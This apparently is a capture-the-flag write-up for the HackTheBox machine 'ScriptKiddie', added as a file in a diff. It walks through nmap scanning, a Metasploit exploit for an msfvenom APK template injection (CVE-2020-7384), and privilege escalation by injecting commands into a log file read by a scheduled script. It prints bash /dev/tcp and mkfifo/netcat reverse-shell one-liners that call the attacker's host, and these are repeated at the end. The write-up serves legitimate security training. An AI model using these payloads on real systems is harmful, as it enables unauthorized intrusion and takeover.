@@ -1,0 +1,152 @@
+#HackTheBox
+#ScriptKiddie
+
+Ennumeration. Initial Scan.
+
+	kali@kali:~/CTF/HTB/Machines/Live/ScriptKiddie$ sudo nmap -A -T4 -sV -O -Pn 10.10.10.226 
+	Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 01:12 EST
+	Nmap scan report for 10.10.10.226
+	Host is up (0.10s latency).
+	Not shown: 998 closed ports
+	PORT     STATE SERVICE VERSION
+	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+	5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+	|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
+	|_http-title: k1d'5 h4ck3r t00l5
+	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+	TCP/IP fingerprint:
+	OS:SCAN(V=7.80%E=4%D=2/7%OT=22%CT=1%CU=33623%PV=Y%DS=2%DC=T%G=Y%TM=601F84F8
+	OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OPS(
+	OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+	OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+	OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+	OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+	OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+	OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+	OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+	OS:S)
+
+	Network Distance: 2 hops
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	TRACEROUTE (using port 1025/tcp)
+	HOP RTT       ADDRESS
+	1   112.54 ms 10.10.14.1
+	2   112.69 ms 10.10.10.226
+
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
+
+We've got Openssh running on port 22 and Werkzeug httpd on port 5000. I've never heard of Werkzeug bit it seems to be a web server. Let's access http://10.10.10.226:5000/
+
+We find a web page. It seems to be a set of hacking tools, we can use searchsploit, msfvenom and nmap on it. msfvenom allows us to upload a template file. This could be used to get a foothold...
+
+After hours of tweaking with this site I got a foothold. I attempted injecting commands into the box since commands are being run with whatever the user inputs. There might be a way to exploit that but I found another attack vector.It turns out there's a vulnerability in msfvenom that was recently disclosed (https://cvedetails.com/cve/CVE-2020-7384/). It can give us command execution in the box by generating an apk payload. There's a metasploit exploit available.
+
+	msf6 > search msfvenom
+
+	Matching Modules
+	================
+
+	   #  Name                                                                    Disclosure Date  Rank       Check  Description
+	   -  ----                                                                    ---------------  ----       -----  -----------
+	   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection
+
+All we have to do is set RHOST and LHOST and run the module. We then setup a netcat listener on our box and upload our payload as an apk file template to the payload generator.
+
+	kali@kali:~/CTF/HTB/Machines/Live/ScriptKiddie$ nc -lvnp 4444
+	Ncat: Version 7.80 ( https://nmap.org/ncat )
+	Ncat: Listening on :::4444
+	Ncat: Listening on 0.0.0.0:4444
+	Ncat: Connection from 10.10.10.226.
+	Ncat: Connection from 10.10.10.226:43518.
+	id
+	uid=1000(kid) gid=1000(kid) groups=1000(kid)
+
+
+We can get a full shell and get the user flag.
+
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	kid@scriptkiddie:~/html$ cat /home/kid/user.txt
+
+Now we have to privesc. Oh boy, this took me a while, I'm a bit rusty buy I pulled it off.
+All we have to do is look around the box. If we go to the home directory, we will find two users: kid and pwn. If we look at the files in pwn's home folder we'll find a directory and a shell script called 'scanlosers.sh'.
+
+	#!/bin/bash
+
+	log=/home/kid/logs/hackers
+
+	cd /home/pwn/
+	cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+	    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+	done
+
+If we look closely we'll find the script runs a command with parameters that it reads from another file called hackers. We can inject code into this script so it will be run by the user pwn, since there was no other privesc vector that I could think of this was the way to go. 
+I noticed the file 'hackers' would go blank after I wrote something on it, the script was being triggered every time the file 'hackers' was written. 
+
+My first attempt was creating a connection to my machine but it didn't work.
+
+	echo ' || bash -i >& /dev/tcp/10.10.14.39/1234 0>&1 > /home/pwn/lol.txt ' > /home/kid/logs/hackers 
+
+So I started trying simpler stuff. I toyed around with the script for a while,  I also sent the output to a file to know what I was doing since the script sends the output to /dev/null.
+
+	echo ' ||10.10.1.10; || 'id' > a.txt || ' > /home/kid/logs/hackers 
+
+This worked, so I then tried:
+
+	echo ' ||10.10.1.10; || 'sudo -l' > a.txt || ' > /home/kid/logs/hackers 
+
+Which gave me this:
+
+	kid@scriptkiddie:/home/pwn$ cat a	
+	cat a.txt 
+	Matching Defaults entries for pwn on scriptkiddie:
+	    env_reset, mail_badpass,
+	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+	User pwn may run the following commands on scriptkiddie:
+	    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+
+So it's pretty evident we can privesc pretty quickly from pwn. All I have to do is pivot into this user.
+After several attempts I managed to get a reverse shell by using an openbsd nc shell (the box has this version of netcat installed).
+
+	kid@scriptkiddie:~/html$ echo " 10.10.1.10; || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1234 >/tmp/f || " > /home/kid/logs/hackers 
+	<10.14.9 1234 >/tmp/f || " > /home/kid/logs/hackers 
+	kid@scriptkiddie:~/html$ 
+
+On my machine I just set up a listener on port 1234 and catch the connection, you can see we have a session
+as pwn:
+
+	kali@kali:~/CTF/HTB/Machines/Live/ScriptKiddie$ nc -lvnp 1234
+	Ncat: Version 7.80 ( https://nmap.org/ncat )
+	Ncat: Listening on :::1234
+	Ncat: Listening on 0.0.0.0:1234
+	Ncat: Connection from 10.10.10.226.
+	Ncat: Connection from 10.10.10.226:57338.
+	/bin/sh: 0: can't access tty; job control turned off
+	$ id
+	uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
+	$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+	pwn@scriptkiddie:~$ 
+
+Now we just have to run msfconsole with sudo and then /bin/bash to pop a shell with root privileges.
+
+	pwn@scriptkiddie:~$ sudo msfconsole
+	msf6 > /bin/bash                                                               
+	/bin/bash
+	[*] exec: /bin/bash
+
+	root@scriptkiddie:/home/pwn# id
+	id
+	uid=0(root) gid=0(root) groups=0(root)
+
+This was a really fun box. I really enjoyed it and I think I worked a bit on what kind of mindset I need to pivot, and not to over complicate things.
+
+
+
+
+
+
+echo " 10.10.1.10; || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.229 1234 >/tmp/f || " > /home/kid/logs/hackers 
+
+echo ' || 'id' > a.txt || ' > /home/kid/logs/hackers 
